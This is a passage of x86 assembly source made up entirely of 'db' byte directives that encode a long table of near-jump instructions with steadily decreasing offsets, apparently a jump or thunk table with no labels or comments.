    db 0E9h,0AAh,53h,00h,00h,0E9h,0A5h,53h,00h,00h,0E9h,0A0h,53h,00h,00h,0E9h
    db 9Bh,53h,00h,00h,0E9h,96h,53h,00h,00h,0E9h,91h,53h,00h,00h,0E9h,8Ch
    db 53h,00h,00h,0E9h,87h,53h,00h,00h,0E9h,82h,53h,00h,00h,0E9h,7Dh,53h
    db 00h,00h,0E9h,78h,53h,00h,00h,0E9h,73h,53h,00h,00h,0E9h,6Eh,53h,00h
    db 00h,0E9h,69h,53h,00h,00h,0E9h,64h,53h,00h,00h,0E9h,5Fh,53h,00h,00h
    db 0E9h,5Ah,53h,00h,00h,0E9h,55h,53h,00h,00h,0E9h,50h,53h,00h,00h,0E9h
    db 4Bh,53h,00h,00h,0E9h,46h,53h,00h,00h,0E9h,41h,53h,00h,00h,0E9h,3Ch
    db 53h,00h,00h,0E9h,37h,53h,00h,00h,0E9h,32h,53h,00h,00h,0E9h,2Dh,53h
    db 00h,00h,0E9h,28h,53h,00h,00h,0E9h,23h,53h,00h,00h,0E9h,1Eh,53h,00h
    db 00h,0E9h,19h,53h,00h,00h,0E9h,14h,53h,00h,00h,0E9h,0Fh,53h,00h,00h
    db 0E9h,0Ah,53h,00h,00h,0E9h,05h,53h,00h,00h,0E9h,00h,53h,00h,00h,0E9h
    db 0FBh,52h,00h,00h,0E9h,0F6h,52h,00h,00h,0E9h,0F1h,52h,00h,00h,0E9h,0ECh
    db 52h,00h,00h,0E9h,0E7h,52h,00h,00h,0E9h,0E2h,52h,00h,00h,0E9h,0DDh,52h
    db 00h,00h,0E9h,0D8h,52h,00h,00h,0E9h,0D3h,52h,00h,00h,0E9h,0CEh,52h,00h
    db 00h,0E9h,0C9h,52h,00h,00h,0E9h,0C4h,52h,00h,00h,0E9h,0BFh,52h,00h,00h
    db 0E9h,0BAh,52h,00h,00h,0E9h,0B5h,52h,00h,00h,0E9h,0B0h,52h,00h,00h,0E9h
    db 0ABh,52h,00h,00h,0E9h,0A6h,52h,00h,00h,0E9h,0A1h,52h,00h,00h,0E9h,9Ch
    db 52h,00h,00h,0E9h,97h,52h,00h,00h,0E9h,92h,52h,00h,00h,0E9h,8Dh,52h
    db 00h,00h,0E9h,88h,52h,00h,00h,0E9h,83h,52h,00h,00h,0E9h,7Eh,52h,00h
    db 00h,0E9h,79h,52h,00h,00h,0E9h,74h,52h,00h,00h,0E9h,6Fh,52h,00h,00h
    db 0E9h,6Ah,52h,00h,00h,0E9h,65h,52h,00h,00h,0E9h,60h,52h,00h,00h,0E9h
    db 5Bh,52h,00h,00h,0E9h,56h,52h,00h,00h,0E9h,51h,52h,00h,00h,0E9h,4Ch
    db 52h,00h,00h,0E9h,47h,52h,00h,00h,0E9h,42h,52h,00h,00h,0E9h,3Dh,52h
    db 00h,00h,0E9h,38h,52h,00h,00h,0E9h,33h,52h,00h,00h,0E9h,2Eh,52h,00h
    db 00h,0E9h,29h,52h,00h,00h,0E9h,24h,52h,00h,00h,0E9h,1Fh,52h,00h,00h
    db 0E9h,1Ah,52h,00h,00h,0E9h,15h,52h,00h,00h,0E9h,10h,52h,00h,00h,0E9h
    db 0Bh,52h,00h,00h,0E9h,06h,52h,00h,00h,0E9h,01h,52h,00h,00h,0E9h,0FCh
    db 51h,00h,00h,0E9h,0F7h,51h,00h,00h,0E9h,0F2h,51h,00h,00h,0E9h,0EDh,51h
    db 00h,00h,0E9h,0E8h,51h,00h,00h,0E9h,0E3h,51h,00h,00h,0E9h,0DEh,51h,00h
    db 00h,0E9h,0D9h,51h,00h,00h,0E9h,0D4h,51h,00h,00h,0E9h,0CFh,51h,00h,00h
    db 0E9h,0CAh,51h,00h,00h,0E9h,0C5h,51h,00h,00h,0E9h,0C0h,51h,00h,00h,0E9h
    db 0BBh,51h,00h,00h,0E9h,0B6h,51h,00h,00h,0E9h,0B1h,51h,00h,00h,0E9h,0ACh
    db 51h,00h,00h,0E9h,0A7h,51h,00h,00h,0E9h,0A2h,51h,00h,00h,0E9h,9Dh,51h
    db 00h,00h,0E9h,98h,51h,00h,00h,0E9h,93h,51h,00h,00h,0E9h,8Eh,51h,00h
    db 00h,0E9h,89h,51h,00h,00h,0E9h,84h,51h,00h,00h,0E9h,7Fh,51h,00h,00h
    db 0E9h,7Ah,51h,00h,00h,0E9h,75h,51h,00h,00h,0E9h,70h,51h,00h,00h,0E9h
    db 6Bh,51h,00h,00h,0E9h,66h,51h,00h,00h,0E9h,61h,51h,00h,00h,0E9h,5Ch
    db 51h,00h,00h,0E9h,57h,51h,00h,00h,0E9h,52h,51h,00h,00h,0E9h,4Dh,51h
    db 00h,00h,0E9h,48h,51h,00h,00h,0E9h,43h,51h,00h,00h,0E9h,3Eh,51h,00h
    db 00h,0E9h,39h,51h,00h,00h,0E9h,34h,51h,00h,00h,0E9h,2Fh,51h,00h,00h
    db 0E9h,2Ah,51h,00h,00h,0E9h,25h,51h,00h,00h,0E9h,20h,51h,00h,00h,0E9h
    db 1Bh,51h,00h,00h,0E9h,16h,51h,00h,00h,0E9h,11h,51h,00h,00h,0E9h,0Ch
    db 51h,00h,00h,0E9h,07h,51h,00h,00h,0E9h,02h,51h,00h,00h,0E9h,0FDh,50h
    db 00h,00h,0E9h,0F8h,50h,00h,00h,0E9h,0F3h,50h,00h,00h,0E9h,0EEh,50h,00h
    db 00h,0E9h,0E9h,50h,00h,00h,0E9h,0E4h,50h,00h,00h,0E9h,0DFh,50h,00h,00h
    db 0E9h,0DAh,50h,00h,00h,0E9h,0D5h,50h,00h,00h,0E9h,0D0h,50h,00h,00h,0E9h
    db 0CBh,50h,00h,00h,0E9h,0C6h,50h,00h,00h,0E9h,0C1h,50h,00h,00h,0E9h,0BCh
    db 50h,00h,00h,0E9h,0B7h,50h,00h,00h,0E9h,0B2h,50h,00h,00h,0E9h,0ADh,50h
    db 00h,00h,0E9h,0A8h,50h,00h,00h,0E9h,0A3h,50h,00h,00h,0E9h,9Eh,50h,00h
    db 00h,0E9h,99h,50h,00h,00h,0E9h,94h,50h,00h,00h,0E9h,8Fh,50h,00h,00h
    db 0E9h,8Ah,50h,00h,00h,0E9h,85h,50h,00h,00h,0E9h,80h,50h,00h,00h,0E9h
    db 7Bh,50h,00h,00h,0E9h,76h,50h,00h,00h,0E9h,71h,50h,00h,00h,0E9h,6Ch
    db 50h,00h,00h,0E9h,67h,50h,00h,00h,0E9h,62h,50h,00h,00h,0E9h,5Dh,50h
    db 00h,00h,0E9h,58h,50h,00h,00h,0E9h,53h,50h,00h,00h,0E9h,4Eh,50h,00h
    db 00h,0E9h,49h,50h,00h,00h,0E9h,44h,50h,00h,00h,0E9h,3Fh,50h,00h,00h
    db 0E9h,3Ah,50h,00h,00h,0E9h,35h,50h,00h,00h,0E9h,30h,50h,00h,00h,0E9h
    db 2Bh,50h,00h,00h,0E9h,26h,50h,00h,00h,0E9h,21h,50h,00h,00h,0E9h,1Ch
    db 50h,00h,00h,0E9h,17h,50h,00h,00h,0E9h,12h,50h,00h,00h,0E9h,0Dh,50h
    db 00h,00h,0E9h,08h,50h,00h,00h,0E9h,03h,50h,00h,00h,0E9h,0FEh,4Fh,00h
    db 00h,0E9h,0F9h,4Fh,00h,00h,0E9h,0F4h,4Fh,00h,00h,0E9h,0EFh,4Fh,00h,00h
    db 0E9h,0EAh,4Fh,00h,00h,0E9h,0E5h,4Fh,00h,00h,0E9h,0E0h,4Fh,00h,00h,0E9h
    db 0DBh,4Fh,00h,00h,0E9h,0D6h,4Fh,00h,00h,0E9h,0D1h,4Fh,00h,00h,0E9h,0CCh
    db 4Fh,00h,00h,0E9h,0C7h,4Fh,00h,00h,0E9h,0C2h,4Fh,00h,00h,0E9h,0BDh,4Fh
    db 00h,00h,0E9h,0B8h,4Fh,00h,00h,0E9h,0B3h,4Fh,00h,00h,0E9h,0AEh,4Fh,00h
    db 00h,0E9h,0A9h,4Fh,00h,00h,0E9h,0A4h,4Fh,00h,00h,0E9h,9Fh,4Fh,00h,00h
    db 0E9h,9Ah,4Fh,00h,00h,0E9h,95h,4Fh,00h,00h,0E9h,90h,4Fh,00h,00h,0E9h
    db 8Bh,4Fh,00h,00h,0E9h,86h,4Fh,00h,00h,0E9h,81h,4Fh,00h,00h,0E9h,7Ch
    db 4Fh,00h,00h,0E9h,77h,4Fh,00h,00h,0E9h,72h,4Fh,00h,00h,0E9h,6Dh,4Fh
    db 00h,00h,0E9h,68h,4Fh,00h,00h,0E9h,63h,4Fh,00h,00h,0E9h,5Eh,4Fh,00h
    db 00h,0E9h,59h,4Fh,00h,00h,0E9h,54h,4Fh,00h,00h,0E9h,4Fh,4Fh,00h,00h
    db 0E9h,4Ah,4Fh,00h,00h,0E9h,45h,4Fh,00h,00h,0E9h,40h,4Fh,00h,00h,0E9h
    db 3Bh,4Fh,00h,00h,0E9h,36h,4Fh,00h,00h,0E9h,31h,4Fh,00h,00h,0E9h,2Ch
    db 4Fh,00h,00h,0E9h,27h,4Fh,00h,00h,0E9h,22h,4Fh,00h,00h,0E9h,1Dh,4Fh
    db 00h,00h,0E9h,18h,4Fh,00h,00h,0E9h,13h,4Fh,00h,00h,0E9h,0Eh,4Fh,00h
    db 00h,0E9h,09h,4Fh,00h,00h,0E9h,04h,4Fh,00h,00h,0E9h,0FFh,4Eh,00h,00h
    db 0E9h,0FAh,4Eh,00h,00h,0E9h,0F5h,4Eh,00h,00h,0E9h,0F0h,4Eh,00h,00h,0E9h
    db 0EBh,4Eh,00h,00h,0E9h,0E6h,4Eh,00h,00h,0E9h,0E1h,4Eh,00h,00h,0E9h,0DCh
    db 4Eh,00h,00h,0E9h,0D7h,4Eh,00h,00h,0E9h,0D2h,4Eh,00h,00h,0E9h,0CDh,4Eh
    db 00h,00h,0E9h,0C8h,4Eh,00h,00h,0E9h,0C3h,4Eh,00h,00h,0E9h,0BEh,4Eh,00h
    db 00h,0E9h,0B9h,4Eh,00h,00h,0E9h,0B4h,4Eh,00h,00h,0E9h,0AFh,4Eh,00h,00h
    db 0E9h,0AAh,4Eh,00h,00h,0E9h,0A5h,4Eh,00h,00h,0E9h,0A0h,4Eh,00h,00h,0E9h
    db 9Bh,4Eh,00h,00h,0E9h,96h,4Eh,00h,00h,0E9h,91h,4Eh,00h,00h,0E9h,8Ch
    db 4Eh,00h,00h,0E9h,87h,4Eh,00h,00h,0E9h,82h,4Eh,00h,00h,0E9h,7Dh,4Eh
    db 00h,00h,0E9h,78h,4Eh,00h,00h,0E9h,73h,4Eh,00h,00h,0E9h,6Eh,4Eh,00h
    db 00h,0E9h,69h,4Eh,00h,00h,0E9h,64h,4Eh,00h,00h,0E9h,5Fh,4Eh,00h,00h
    db 0E9h,5Ah,4Eh,00h,00h,0E9h,55h,4Eh,00h,00h,0E9h,50h,4Eh,00h,00h,0E9h
    db 4Bh,4Eh,00h,00h,0E9h,46h,4Eh,00h,00h,0E9h,41h,4Eh,00h,00h,0E9h,3Ch
    db 4Eh,00h,00h,0E9h,37h,4Eh,00h,00h,0E9h,32h,4Eh,00h,00h,0E9h,2Dh,4Eh
    db 00h,00h,0E9h,28h,4Eh,00h,00h,0E9h,23h,4Eh,00h,00h,0E9h,1Eh,4Eh,00h
    db 00h,0E9h,19h,4Eh,00h,00h,0E9h,14h,4Eh,00h,00h,0E9h,0Fh,4Eh,00h,00h
    db 0E9h,0Ah,4Eh,00h,00h,0E9h,05h,4Eh,00h,00h,0E9h,00h,4Eh,00h,00h,0E9h
    db 0FBh,4Dh,00h,00h,0E9h,0F6h,4Dh,00h,00h,0E9h,0F1h,4Dh,00h,00h,0E9h,0ECh
    db 4Dh,00h,00h,0E9h,0E7h,4Dh,00h,00h,0E9h,0E2h,4Dh,00h,00h,0E9h,0DDh,4Dh
    db 00h,00h,0E9h,0D8h,4Dh,00h,00h,0E9h,0D3h,4Dh,00h,00h,0E9h,0CEh,4Dh,00h
    db 00h,0E9h,0C9h,4Dh,00h,00h,0E9h,0C4h,4Dh,00h,00h,0E9h,0BFh,4Dh,00h,00h
    db 0E9h,0BAh,4Dh,00h,00h,0E9h,0B5h,4Dh,00h,00h,0E9h,0B0h,4Dh,00h,00h,0E9h
    db 0ABh,4Dh,00h,00h,0E9h,0A6h,4Dh,00h,00h,0E9h,0A1h,4Dh,00h,00h,0E9h,9Ch
    db 4Dh,00h,00h,0E9h,97h,4Dh,00h,00h,0E9h,92h,4Dh,00h,00h,0E9h,8Dh,4Dh
    db 00h,00h,0E9h,88h,4Dh,00h,00h,0E9h,83h,4Dh,00h,00h,0E9h,7Eh,4Dh,00h
    db 00h,0E9h,79h,4Dh,00h,00h,0E9h,74h,4Dh,00h,00h,0E9h,6Fh,4Dh,00h,00h
    db 0E9h,6Ah,4Dh,00h,00h,0E9h,65h,4Dh,00h,00h,0E9h,60h,4Dh,00h,00h,0E9h
    db 5Bh,4Dh,00h,00h,0E9h,56h,4Dh,00h,00h,0E9h,51h,4Dh,00h,00h,0E9h,4Ch
    db 4Dh,00h,00h,0E9h,47h,4Dh,00h,00h,0E9h,42h,4Dh,00h,00h,0E9h,3Dh,4Dh
    db 00h,00h,0E9h,38h,4Dh,00h,00h,0E9h,33h,4Dh,00h,00h,0E9h,2Eh,4Dh,00h
    db 00h,0E9h,29h,4Dh,00h,00h,0E9h,24h,4Dh,00h,00h,0E9h,1Fh,4Dh,00h,00h
    db 0E9h,1Ah,4Dh,00h,00h,0E9h,15h,4Dh,00h,00h,0E9h,10h,4Dh,00h,00h,0E9h
    db 0Bh,4Dh,00h,00h,0E9h,06h,4Dh,00h,00h,0E9h,01h,4Dh,00h,00h,0E9h,0FCh
    db 4Ch,00h,00h,0E9h,0F7h,4Ch,00h,00h,0E9h,0F2h,4Ch,00h,00h,0E9h,0EDh,4Ch
    db 00h,00h,0E9h,0E8h,4Ch,00h,00h,0E9h,0E3h,4Ch,00h,00h,0E9h,0DEh,4Ch,00h
    db 00h,0E9h,0D9h,4Ch,00h,00h,0E9h,0D4h,4Ch,00h,00h,0E9h,0CFh,4Ch,00h,00h
    db 0E9h,0CAh,4Ch,00h,00h,0E9h,0C5h,4Ch,00h,00h,0E9h,0C0h,4Ch,00h,00h,0E9h
    db 0BBh,4Ch,00h,00h,0E9h,0B6h,4Ch,00h,00h,0E9h,0B1h,4Ch,00h,00h,0E9h,0ACh
    db 4Ch,00h,00h,0E9h,0A7h,4Ch,00h,00h,0E9h,0A2h,4Ch,00h,00h,0E9h,9Dh,4Ch
    db 00h,00h,0E9h,98h,4Ch,00h,00h,0E9h,93h,4Ch,00h,00h,0E9h,8Eh,4Ch,00h
    db 00h,0E9h,89h,4Ch,00h,00h,0E9h,84h,4Ch,00h,00h,0E9h,7Fh,4Ch,00h,00h
    db 0E9h,7Ah,4Ch,00h,00h,0E9h,75h,4Ch,00h,00h,0E9h,70h,4Ch,00h,00h,0E9h
    db 6Bh,4Ch,00h,00h,0E9h,66h,4Ch,00h,00h,0E9h,61h,4Ch,00h,00h,0E9h,5Ch
    db 4Ch,00h,00h,0E9h,57h,4Ch,00h,00h,0E9h,52h,4Ch,00h,00h,0E9h,4Dh,4Ch
    db 00h,00h,0E9h,48h,4Ch,00h,00h,0E9h,43h,4Ch,00h,00h,0E9h,3Eh,4Ch,00h
    db 00h,0E9h,39h,4Ch,00h,00h,0E9h,34h,4Ch,00h,00h,0E9h,2Fh,4Ch,00h,00h
    db 0E9h,2Ah,4Ch,00h,00h,0E9h,25h,4Ch,00h,00h,0E9h,20h,4Ch,00h,00h,0E9h
    db 1Bh,4Ch,00h,00h,0E9h,16h,4Ch,00h,00h,0E9h,11h,4Ch,00h,00h,0E9h,0Ch
    db 4Ch,00h,00h,0E9h,07h,4Ch,00h,00h,0E9h,02h,4Ch,00h,00h,0E9h,0FDh,4Bh
    db 00h,00h,0E9h,0F8h,4Bh,00h,00h,0E9h,0F3h,4Bh,00h,00h,0E9h,0EEh,4Bh,00h
    db 00h,0E9h,0E9h,4Bh,00h,00h,0E9h,0E4h,4Bh,00h,00h,0E9h,0DFh,4Bh,00h,00h
    db 0E9h,0DAh,4Bh,00h,00h,0E9h,0D5h,4Bh,00h,00h,0E9h,0D0h,4Bh,00h,00h,0E9h
    db 0CBh,4Bh,00h,00h,0E9h,0C6h,4Bh,00h,00h,0E9h,0C1h,4Bh,00h,00h,0E9h,0BCh
    db 4Bh,00h,00h,0E9h,0B7h,4Bh,00h,00h,0E9h,0B2h,4Bh,00h,00h,0E9h,0ADh,4Bh
    db 00h,00h,0E9h,0A8h,4Bh,00h,00h,0E9h,0A3h,4Bh,00h,00h,0E9h,9Eh,4Bh,00h
    db 00h,0E9h,99h,4Bh,00h,00h,0E9h,94h,4Bh,00h,00h,0E9h,8Fh,4Bh,00h,00h
    db 0E9h,8Ah,4Bh,00h,00h,0E9h,85h,4Bh,00h,00h,0E9h,80h,4Bh,00h,00h,0E9h
    db 7Bh,4Bh,00h,00h,0E9h,76h,4Bh,00h,00h,0E9h,71h,4Bh,00h,00h,0E9h,6Ch
    db 4Bh,00h,00h,0E9h,67h,4Bh,00h,00h,0E9h,62h,4Bh,00h,00h,0E9h,5Dh,4Bh
    db 00h,00h,0E9h,58h,4Bh,00h,00h,0E9h,53h,4Bh,00h,00h,0E9h,4Eh,4Bh,00h
    db 00h,0E9h,49h,4Bh,00h,00h,0E9h,44h,4Bh,00h,00h,0E9h,3Fh,4Bh,00h,00h
    db 0E9h,3Ah,4Bh,00h,00h,0E9h,35h,4Bh,00h,00h,0E9h,30h,4Bh,00h,00h,0E9h
    db 2Bh,4Bh,00h,00h,0E9h,26h,4Bh,00h,00h,0E9h,21h,4Bh,00h,00h,0E9h,1Ch
    db 4Bh,00h,00h,0E9h,17h,4Bh,00h,00h,0E9h,12h,4Bh,00h,00h,0E9h,0Dh,4Bh
    db 00h,00h,0E9h,08h,4Bh,00h,00h,0E9h,03h,4Bh,00h,00h,0E9h,0FEh,4Ah,00h
    db 00h,0E9h,0F9h,4Ah,00h,00h,0E9h,0F4h,4Ah,00h,00h,0E9h,0EFh,4Ah,00h,00h
    db 0E9h,0EAh,4Ah,00h,00h,0E9h,0E5h,4Ah,00h,00h,0E9h,0E0h,4Ah,00h,00h,0E9h
    db 0DBh,4Ah,00h,00h,0E9h,0D6h,4Ah,00h,00h,0E9h,0D1h,4Ah,00h,00h,0E9h,0CCh
    db 4Ah,00h,00h,0E9h,0C7h,4Ah,00h,00h,0E9h,0C2h,4Ah,00h,00h,0E9h,0BDh,4Ah
    db 00h,00h,0E9h,0B8h,4Ah,00h,00h,0E9h,0B3h,4Ah,00h,00h,0E9h,0AEh,4Ah,00h
    db 00h,0E9h,0A9h,4Ah,00h,00h,0E9h,0A4h,4Ah,00h,00h,0E9h,9Fh,4Ah,00h,00h
    db 0E9h,9Ah,4Ah,00h,00h,0E9h,95h,4Ah,00h,00h,0E9h,90h,4Ah,00h,00h,0E9h
    db 8Bh,4Ah,00h,00h,0E9h,86h,4Ah,00h,00h,0E9h,81h,4Ah,00h,00h,0E9h,7Ch
    db 4Ah,00h,00h,0E9h,77h,4Ah,00h,00h,0E9h,72h,4Ah,00h,00h,0E9h,6Dh,4Ah
    db 00h,00h,0E9h,68h,4Ah,00h,00h,0E9h,63h,4Ah,00h,00h,0E9h,5Eh,4Ah,00h
    db 00h,0E9h,59h,4Ah,00h,00h,0E9h,54h,4Ah,00h,00h,0E9h,4Fh,4Ah,00h,00h
    db 0E9h,4Ah,4Ah,00h,00h,0E9h,45h,4Ah,00h,00h,0E9h,40h,4Ah,00h,00h,0E9h
    db 3Bh,4Ah,00h,00h,0E9h,36h,4Ah,00h,00h,0E9h,31h,4Ah,00h,00h,0E9h,2Ch
    db 4Ah,00h,00h,0E9h,27h,4Ah,00h,00h,0E9h,22h,4Ah,00h,00h,0E9h,1Dh,4Ah
    db 00h,00h,0E9h,18h,4Ah,00h,00h,0E9h,13h,4Ah,00h,00h,0E9h,0Eh,4Ah,00h
    db 00h,0E9h,09h,4Ah,00h,00h,0E9h,04h,4Ah,00h,00h,0E9h,0FFh,49h,00h,00h
    db 0E9h,0FAh,49h,00h,00h,0E9h,0F5h,49h,00h,00h,0E9h,0F0h,49h,00h,00h,0E9h
    db 0EBh,49h,00h,00h,0E9h,0E6h,49h,00h,00h,0E9h,0E1h,49h,00h,00h,0E9h,0DCh
    db 49h,00h,00h,0E9h,0D7h,49h,00h,00h,0E9h,0D2h,49h,00h,00h,0E9h,0CDh,49h
    db 00h,00h,0E9h,0C8h,49h,00h,00h,0E9h,0C3h,49h,00h,00h,0E9h,0BEh,49h,00h
    db 00h,0E9h,0B9h,49h,00h,00h,0E9h,0B4h,49h,00h,00h,0E9h,0AFh,49h,00h,00h
    db 0E9h,0AAh,49h,00h,00h,0E9h,0A5h,49h,00h,00h,0E9h,0A0h,49h,00h,00h,0E9h
    db 9Bh,49h,00h,00h,0E9h,96h,49h,00h,00h,0E9h,91h,49h,00h,00h,0E9h,8Ch
    db 49h,00h,00h,0E9h,87h,49h,00h,00h,0E9h,82h,49h,00h,00h,0E9h,7Dh,49h
    db 00h,00h,0E9h,78h,49h,00h,00h,0E9h,73h,49h,00h,00h,0E9h,6Eh,49h,00h
    db 00h,0E9h,69h,49h,00h,00h,0E9h,64h,49h,00h,00h,0E9h,5Fh,49h,00h,00h
    db 0E9h,5Ah,49h,00h,00h,0E9h,55h,49h,00h,00h,0E9h,50h,49h,00h,00h,0E9h
    db 4Bh,49h,00h,00h,0E9h,46h,49h,00h,00h,0E9h,41h,49h,00h,00h,0E9h,3Ch
    db 49h,00h,00h,0E9h,37h,49h,00h,00h,0E9h,32h,49h,00h,00h,0E9h,2Dh,49h
    db 00h,00h,0E9h,28h,49h,00h,00h,0E9h,23h,49h,00h,00h,0E9h,1Eh,49h,00h
    db 00h,0E9h,19h,49h,00h,00h,0E9h,14h,49h,00h,00h,0E9h,0Fh,49h,00h,00h
    db 0E9h,0Ah,49h,00h,00h,0E9h,05h,49h,00h,00h,0E9h,00h,49h,00h,00h,0E9h
    db 0FBh,48h,00h,00h,0E9h,0F6h,48h,00h,00h,0E9h,0F1h,48h,00h,00h,0E9h,0ECh
    db 48h,00h,00h,0E9h,0E7h,48h,00h,00h,0E9h,0E2h,48h,00h,00h,0E9h,0DDh,48h
    db 00h,00h,0E9h,0D8h,48h,00h,00h,0E9h,0D3h,48h,00h,00h,0E9h,0CEh,48h,00h
    db 00h,0E9h,0C9h,48h,00h,00h,0E9h,0C4h,48h,00h,00h,0E9h,0BFh,48h,00h,00h
    db 0E9h,0BAh,48h,00h,00h,0E9h,0B5h,48h,00h,00h,0E9h,0B0h,48h,00h,00h,0E9h
    db 0ABh,48h,00h,00h,0E9h,0A6h,48h,00h,00h,0E9h,0A1h,48h,00h,00h,0E9h,9Ch
    db 48h,00h,00h,0E9h,97h,48h,00h,00h,0E9h,92h,48h,00h,00h,0E9h,8Dh,48h
    db 00h,00h,0E9h,88h,48h,00h,00h,0E9h,83h,48h,00h,00h,0E9h,7Eh,48h,00h
    db 00h,0E9h,79h,48h,00h,00h,0E9h,74h,48h,00h,00h,0E9h,6Fh,48h,00h,00h
    db 0E9h,6Ah,48h,00h,00h,0E9h,65h,48h,00h,00h,0E9h,60h,48h,00h,00h,0E9h
    db 5Bh,48h,00h,00h,0E9h,56h,48h,00h,00h,0E9h,51h,48h,00h,00h,0E9h,4Ch
    db 48h,00h,00h,0E9h,47h,48h,00h,00h,0E9h,42h,48h,00h,00h,0E9h,3Dh,48h
    db 00h,00h,0E9h,38h,48h,00h,00h,0E9h,33h,48h,00h,00h,0E9h,2Eh,48h,00h
    db 00h,0E9h,29h,48h,00h,00h,0E9h,24h,48h,00h,00h,0E9h,1Fh,48h,00h,00h
    db 0E9h,1Ah,48h,00h,00h,0E9h,15h,48h,00h,00h,0E9h,10h,48h,00h,00h,0E9h
    db 0Bh,48h,00h,00h,0E9h,06h,48h,00h,00h,0E9h,01h,48h,00h,00h,0E9h,0FCh
    db 47h,00h,00h,0E9h,0F7h,47h,00h,00h,0E9h,0F2h,47h,00h,00h,0E9h,0EDh,47h
    db 00h,00h,0E9h,0E8h,47h,00h,00h,0E9h,0E3h,47h,00h,00h,0E9h,0DEh,47h,00h
    db 00h,0E9h,0D9h,47h,00h,00h,0E9h,0D4h,47h,00h,00h,0E9h,0CFh,47h,00h,00h
    db 0E9h,0CAh,47h,00h,00h,0E9h,0C5h,47h,00h,00h,0E9h,0C0h,47h,00h,00h,0E9h
    db 0BBh,47h,00h,00h,0E9h,0B6h,47h,00h,00h,0E9h,0B1h,47h,00h,00h,0E9h,0ACh
    db 47h,00h,00h,0E9h,0A7h,47h,00h,00h,0E9h,0A2h,47h,00h,00h,0E9h,9Dh,47h
    db 00h,00h,0E9h,98h,47h,00h,00h,0E9h,93h,47h,00h,00h,0E9h,8Eh,47h,00h
    db 00h,0E9h,89h,47h,00h,00h,0E9h,84h,47h,00h,00h,0E9h,7Fh,47h,00h,00h
    db 0E9h,7Ah,47h,00h,00h,0E9h,75h,47h,00h,00h,0E9h,70h,47h,00h,00h,0E9h
    db 6Bh,47h,00h,00h,0E9h,66h,47h,00h,00h,0E9h,61h,47h,00h,00h,0E9h,5Ch
    db 47h,00h,00h,0E9h,57h,47h,00h,00h,0E9h,52h,47h,00h,00h,0E9h,4Dh,47h
    db 00h,00h,0E9h,48h,47h,00h,00h,0E9h,43h,47h,00h,00h,0E9h,3Eh,47h,00h
    db 00h,0E9h,39h,47h,00h,00h,0E9h,34h,47h,00h,00h,0E9h,2Fh,47h,00h,00h
    db 0E9h,2Ah,47h,00h,00h,0E9h,25h,47h,00h,00h,0E9h,20h,47h,00h,00h,0E9h
    db 1Bh,47h,00h,00h,0E9h,16h,47h,00h,00h,0E9h,11h,47h,00h,00h,0E9h,0Ch
    db 47h,00h,00h,0E9h,07h,47h,00h,00h,0E9h,02h,47h,00h,00h,0E9h,0FDh,46h
    db 00h,00h,0E9h,0F8h,46h,00h,00h,0E9h,0F3h,46h,00h,00h,0E9h,0EEh,46h,00h
    db 00h,0E9h,0E9h,46h,00h,00h,0E9h,0E4h,46h,00h,00h,0E9h,0DFh,46h,00h,00h
    db 0E9h,0DAh,46h,00h,00h,0E9h,0D5h,46h,00h,00h,0E9h,0D0h,46h,00h,00h,0E9h
    db 0CBh,46h,00h,00h,0E9h,0C6h,46h,00h,00h,0E9h,0C1h,46h,00h,00h,0E9h,0BCh
    db 46h,00h,00h,0E9h,0B7h,46h,00h,00h,0E9h,0B2h,46h,00h,00h,0E9h,0ADh,46h
    db 00h,00h,0E9h,0A8h,46h,00h,00h,0E9h,0A3h,46h,00h,00h,0E9h,9Eh,46h,00h
    db 00h,0E9h,99h,46h,00h,00h,0E9h,94h,46h,00h,00h,0E9h,8Fh,46h,00h,00h
    db 0E9h,8Ah,46h,00h,00h,0E9h,85h,46h,00h,00h,0E9h,80h,46h,00h,00h,0E9h
    db 7Bh,46h,00h,00h,0E9h,76h,46h,00h,00h,0E9h,71h,46h,00h,00h,0E9h,6Ch
    db 46h,00h,00h,0E9h,67h,46h,00h,00h,0E9h,62h,46h,00h,00h,0E9h,5Dh,46h
    db 00h,00h,0E9h,58h,46h,00h,00h,0E9h,53h,46h,00h,00h,0E9h,4Eh,46h,00h
    db 00h,0E9h,49h,46h,00h,00h,0E9h,44h,46h,00h,00h,0E9h,3Fh,46h,00h,00h
    db 0E9h,3Ah,46h,00h,00h,0E9h,35h,46h,00h,00h,0E9h,30h,46h,00h,00h,0E9h
    db 2Bh,46h,00h,00h,0E9h,26h,46h,00h,00h,0E9h,21h,46h,00h,00h,0E9h,1Ch
    db 46h,00h,00h,0E9h,17h,46h,00h,00h,0E9h,12h,46h,00h,00h,0E9h,0Dh,46h
    db 00h,00h,0E9h,08h,46h,00h,00h,0E9h,03h,46h,00h,00h,0E9h,0FEh,45h,00h
    db 00h,0E9h,0F9h,45h,00h,00h,0E9h,0F4h,45h,00h,00h,0E9h,0EFh,45h,00h,00h
    db 0E9h,0EAh,45h,00h,00h,0E9h,0E5h,45h,00h,00h,0E9h,0E0h,45h,00h,00h,0E9h
    db 0DBh,45h,00h,00h,0E9h,0D6h,45h,00h,00h,0E9h,0D1h,45h,00h,00h,0E9h,0CCh
    db 45h,00h,00h,0E9h,0C7h,45h,00h,00h,0E9h,0C2h,45h,00h,00h,0E9h,0BDh,45h
    db 00h,00h,0E9h,0B8h,45h,00h,00h,0E9h,0B3h,45h,00h,00h,0E9h,0AEh,45h,00h
    db 00h,0E9h,0A9h,45h,00h,00h,0E9h,0A4h,45h,00h,00h,0E9h,9Fh,45h,00h,00h
    db 0E9h,9Ah,45h,00h,00h,0E9h,95h,45h,00h,00h,0E9h,90h,45h,00h,00h,0E9h
    db 8Bh,45h,00h,00h,0E9h,86h,45h,00h,00h,0E9h,81h,45h,00h,00h,0E9h,7Ch
    db 45h,00h,00h,0E9h,77h,45h,00h,00h,0E9h,72h,45h,00h,00h,0E9h,6Dh,45h
    db 00h,00h,0E9h,68h,45h,00h,00h,0E9h,63h,45h,00h,00h,0E9h,5Eh,45h,00h
    db 00h,0E9h,59h,45h,00h,00h,0E9h,54h,45h,00h,00h,0E9h,4Fh,45h,00h,00h
    db 0E9h,4Ah,45h,00h,00h,0E9h,45h,45h,00h,00h,0E9h,40h,45h,00h,00h,0E9h
    db 3Bh,45h,00h,00h,0E9h,36h,45h,00h,00h,0E9h,31h,45h,00h,00h,0E9h,2Ch
    db 45h,00h,00h,0E9h,27h,45h,00h,00h,0E9h,22h,45h,00h,00h,0E9h,1Dh,45h
    db 00h,00h,0E9h,18h,45h,00h,00h,0E9h,13h,45h,00h,00h,0E9h,0Eh,45h,00h
